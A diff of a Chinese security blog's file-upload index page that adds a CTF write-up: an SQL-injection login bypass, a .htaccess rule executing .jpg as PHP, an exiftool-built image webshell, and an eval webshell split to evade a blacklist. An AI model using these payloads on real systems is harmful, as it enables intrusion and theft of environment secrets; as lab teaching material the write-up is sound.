@@ -1781,6 +1781,10 @@
       
         
       
+        
+      
+        
+      
     
     
     
@@ -1828,6 +1832,36 @@
 
           </label>
           <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+    
+  
+  
+    <li class="md-nav__item">
+      <a href="../htaccess/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    .htaccess
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
             
               
                 
@@ -2228,6 +2262,36 @@
   
   
     <li class="md-nav__item">
+      <a href="../%E5%9B%BE%E7%89%87%E9%A9%AC/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    图片马
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+    
+  
+  
+    <li class="md-nav__item">
       <a href="../%E5%AE%A2%E6%88%B7%E7%AB%AF%E4%BF%A1%E4%BB%BB/" class="md-nav__link">
         
   
@@ -2527,6 +2591,122 @@
       <header class="md-typeset">
         <h1 id="_1">文件上传<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h1>
       </header>
+      
+        <article class="md-post md-post--excerpt">
+  <header class="md-post__header">
+    
+    <div class="md-post__meta md-meta">
+      <ul class="md-meta__list">
+        <li class="md-meta__item">
+          <time datetime="2026-10-29 00:00:00+00:00">2026-10-29</time></li>
+        
+          <li class="md-meta__item">
+            分类于
+            
+              <a href="./" class="md-meta__link">文件上传</a>, 
+              <a href="../htaccess/" class="md-meta__link">.htaccess</a>, 
+              <a href="../%E5%9B%BE%E7%89%87%E9%A9%AC/" class="md-meta__link">图片马</a></li>
+        
+        
+          
+          <li class="md-meta__item">
+            
+              需要 2 分钟阅读时间
+            
+          </li>
+        
+        
+      </ul>
+      
+    </div>
+  </header>
+  <div class="md-post__content md-typeset">
+    <h2 id="stage3-upload"><a class="toclink" href="../../zerog2026-stage3-upload/">Stage3 — Upload（极光科技）</a></h2>
+<p>刚进去看到只有一个图片，直接先看看源码：</p>
+<p><img alt="页脚里的后台入口" src="../../../assets/images/zerog2026-stage3-upload/01-footer.png" /></p>
+<p><strong>发现有一个 <code>admin</code> 后台管理</strong> —— 页脚里的 <code>&lt;a href="admin/"&gt;后台管理&lt;/a&gt;</code>。</p>
+<h3 id="_1"><a class="toclink" href="../../zerog2026-stage3-upload/#_1">进后台</a></h3>
+<p>进去看看，发现需要登陆。利用万能密码：</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-30-1"><a id="__codelineno-30-1" name="__codelineno-30-1" href="#__codelineno-30-1"></a>admin'-- -
+</span></code></pre></div>
+<p>成功进入。</p>
+<p><strong>为什么这样能过 —— 因为后端大概是这样拼的：</strong></p>
+<div class="language-sql highlight"><pre><span></span><code><span id="__span-31-1"><a id="__codelineno-31-1" name="__codelineno-31-1" href="#__codelineno-31-1"></a><span class="k">SELECT</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">users</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">username</span><span class="o">=</span><span class="s1">'$u'</span><span class="w"> </span><span class="k">AND</span><span class="w"> </span><span class="n">password</span><span class="o">=</span><span class="s1">'$p'</span>
+</span></code></pre></div>
+<p><strong>填进去之后变成：</strong></p>
+<div class="language-sql highlight"><pre><span></span><code><span id="__span-32-1"><a id="__codelineno-32-1" name="__codelineno-32-1" href="#__codelineno-32-1"></a><span class="k">SELECT</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">users</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">username</span><span class="o">=</span><span class="s1">'admin'</span><span class="c1">-- -' AND password='...'</span>
+</span><span id="__span-32-2"><a id="__codelineno-32-2" name="__codelineno-32-2" href="#__codelineno-32-2"></a><span class="w">                                          </span><span class="err">↑</span><span class="w"> </span><span class="err">从这里开始全被注释掉</span>
+</span></code></pre></div>
+<p><strong><code>--</code> 是 SQL 的注释符，后面那一整段（包括密码判断）都不执行了。</strong></p>
+<p><strong>所以它连密码都不用填对 —— 不用构造“条件为真”，只要让后半句消失就行。</strong></p>
+<h3 id="_2"><a class="toclink" href="../../zerog2026-stage3-upload/#_2">两个上传点</a></h3>
+<p>进去后发现可以上传配置文件：</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-33-1"><a id="__codelineno-33-1" name="__codelineno-33-1" href="#__codelineno-33-1"></a>🖼️ 更新海报      只收 JPEG / GIF / PNG
+</span><span id="__span-33-2"><a id="__codelineno-33-2" name="__codelineno-33-2" href="#__codelineno-33-2"></a>⚙️ 配置文件管理    收 .htaccess / .ini
+</span></code></pre></div>
+<p><strong>先试试上传图片：</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-34-1"><a id="__codelineno-34-1" name="__codelineno-34-1" href="#__codelineno-34-1"></a>直接上传一个空的 jpg  →  提示格式不对
+</span><span id="__span-34-2"><a id="__codelineno-34-2" name="__codelineno-34-2" href="#__codelineno-34-2"></a>上传正常的 jpg        →  可以
+</span></code></pre></div>
+<p><strong>这里就知道了会对</strong>内容<strong>进行校验，所以这里就明确用</strong>图片马<strong>。</strong></p>
+<h3 id="htaccess"><a class="toclink" href="../../zerog2026-stage3-upload/#htaccess">先上传 .htaccess</a></h3>
+<p>内容就一行：</p>
+<div class="language-apache highlight"><pre><span></span><code><span id="__span-35-1"><a id="__codelineno-35-1" name="__codelineno-35-1" href="#__codelineno-35-1"></a><span class="nb">AddType</span><span class="w"> </span>application/x-httpd-php<span class="w"> </span>.jpg
+</span></code></pre></div>
+<p><strong>⚠️ 这里要注意检查一遍。</strong></p>
+<p><strong>我最开始打成了 <code>httped</code>（多了 e 少了 d），导致后面一直以为我的命令被过滤了 —— 其实 PHP 根本没接管这个文件。</strong></p>
+<p><strong>判断依据：传完之后访问 <code>poster.jpg</code>，如果浏览器弹「保存文件」，就是 MIME 没被识别成 PHP；正常执行时 <code>Content-Type</code> 会变成 <code>text/html</code>。</strong></p>
+<h3 id="exiftool"><a class="toclink" href="../../zerog2026-stage3-upload/#exiftool">再用 exiftool 做图片马</a></h3>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-36-1"><a id="__codelineno-36-1" name="__codelineno-36-1" href="#__codelineno-36-1"></a><span class="n">exiftool</span> <span class="n">-Comment</span><span class="p">=</span><span class="s1">'&lt;?php echo `$_GET[1]`; ?&gt;'</span> <span class="n">poster</span><span class="p">.</span><span class="n">jpg</span> <span class="n">-o</span> <span class="n">po1</span><span class="p">.</span><span class="n">jpg</span>
+</span></code></pre></div>
+<p><strong>我本来随便拿了一个 jpg 来构造，但是因为它内容较大、二进制数据较多，里面或多或少会出现 <code>&lt;?</code>。</strong></p>
+<p><strong>PHP 一旦在二进制里遇到 <code>&lt;?</code> 就当成 PHP 开头来解析，后面跟着的是随机字节 —— 于是报错：</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-37-1"><a id="__codelineno-37-1" name="__codelineno-37-1" href="#__codelineno-37-1"></a>Parse error: syntax error, unexpected character 0x0E
+</span><span id="__span-37-2"><a id="__codelineno-37-2" name="__codelineno-37-2" href="#__codelineno-37-2"></a>in /var/www/html/uploads/poster.jpg on line 31
+</span></code></pre></div>
+<p><strong>所以这里建议用</strong>小体量<strong>的 jpg：比如题目里的背景图 <code>poster.jpg</code>，直接下载下来用。</strong></p>
+<p><strong>然后访问：</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-38-1"><a id="__codelineno-38-1" name="__codelineno-38-1" href="#__codelineno-38-1"></a>/uploads/poster.jpg?1=env
+</span></code></pre></div>
+<p><strong>就能看到 flag：</strong></p>
+<p><img alt="env 里的 flag" src="../../../assets/images/zerog2026-stage3-upload/02-env-flag.png" /></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-39-1"><a id="__codelineno-39-1" name="__codelineno-39-1" href="#__codelineno-39-1"></a>ZeroG_2026_FLAG=ZeroGFlag{...}
+</span></code></pre></div>
+<hr />
+<h3 id="_3"><a class="toclink" href="../../zerog2026-stage3-upload/#_3">附：三个问题</a></h3>
+<h4 id="1-posterjpgv1793248668-v"><a class="toclink" href="../../zerog2026-stage3-upload/#1-posterjpgv1793248668-v">① <code>poster.jpg?v=1793248668</code> 里的 <code>v=</code> 是什么</a></h4>
+<p><img alt="Network 里的请求" src="../../../assets/images/zerog2026-stage3-upload/03-cache-buster.png" /></p>
+<p><strong>缓存破坏参数（cache buster）。</strong></p>
+<p><strong>文件名永远是 <code>poster.jpg</code>，浏览器会缓存旧图；加一个每次变化的 <code>v</code>（通常是 Unix 时间戳）让 URL 变掉，强制重新下载。</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-40-1"><a id="__codelineno-40-1" name="__codelineno-40-1" href="#__codelineno-40-1"></a>1793248668 ≈ 2026-10-29 的 Unix 时间戳（秒）
+</span></code></pre></div>
+<p><strong>服务器不读它，PHP 也不用它 —— 纯前端约定。</strong> 对我们反而有用：改完 payload 带上新 <code>v</code>，能确保看到的是新响应。</p>
+<h4 id="2-env-flag"><a class="toclink" href="../../zerog2026-stage3-upload/#2-env-flag">② 为什么用 <code>env</code> 找 flag，而不是找目录</a></h4>
+<p><strong>因为 flag 不一定是文件。</strong></p>
+<p><strong>这题的 flag 是平台在容器启动时通过环境变量注入的，不落盘：</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-41-1"><a id="__codelineno-41-1" name="__codelineno-41-1" href="#__codelineno-41-1"></a>flag 不落盘 → 读文件读不到 → 备份/目录遍历/源码泄露都拿不到
+</span><span id="__span-41-2"><a id="__codelineno-41-2" name="__codelineno-41-2" href="#__codelineno-41-2"></a>只有真正拿到 RCE 才能读 → 考的是"能执行命令",不是"能猜路径"
+</span></code></pre></div>
+<p><strong>排查顺序应该是：</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-42-1"><a id="__codelineno-42-1" name="__codelineno-42-1" href="#__codelineno-42-1"></a>① ls -la /            先看有没有 flag 文件
+</span><span id="__span-42-2"><a id="__codelineno-42-2" name="__codelineno-42-2" href="#__codelineno-42-2"></a>② env                 没有就查环境变量
+</span><span id="__span-42-3"><a id="__codelineno-42-3" name="__codelineno-42-3" href="#__codelineno-42-3"></a>③ find / -name "*flag*"   再扫一遍
+</span><span id="__span-42-4"><a id="__codelineno-42-4" name="__codelineno-42-4" href="#__codelineno-42-4"></a>④ cat /proc/self/environ  环境变量换个读法
+</span></code></pre></div>
+<h4 id="3-_post"><a class="toclink" href="../../zerog2026-stage3-upload/#3-_post">③ 能不能用 <code>$_POST</code> + 蚁剑</a></h4>
+<p><strong>能，但 <code>echo</code>$_POST["1"]`` 这种写法不行。</strong></p>
+<p><strong><code>echo \</code>...`` 是</strong>命令执行** —— 参数被当 shell 命令跑。**</p>
+<p><strong>蚁剑要的是</strong>代码执行** —— 它往参数里塞的是 PHP 代码，入口必须是：**</p>
+<div class="language-php highlight"><pre><span></span><code><span id="__span-43-1"><a id="__codelineno-43-1" name="__codelineno-43-1" href="#__codelineno-43-1"></a><span class="x">eval($_POST['x'])</span>
+</span></code></pre></div>
+<p><strong>而 <code>eval</code> 在黑名单里，所以要用拼接：</strong></p>
+<div class="language-php highlight"><pre><span></span><code><span id="__span-44-1"><a id="__codelineno-44-1" name="__codelineno-44-1" href="#__codelineno-44-1"></a><span class="x">$a='ev'.'al'; $a($_POST[1]);</span>
+</span></code></pre></div>
+<p><strong>关键点：这道题的黑名单只扫</strong>上传文件的内容<strong>，不扫 HTTP 请求体 —— 所以蚁剑发过来的 body 里带什么词都不受影响。</strong></p>
+    
+    
+  </div>
+</article>
       
         <article class="md-post md-post--excerpt">
   <header class="md-post__header">
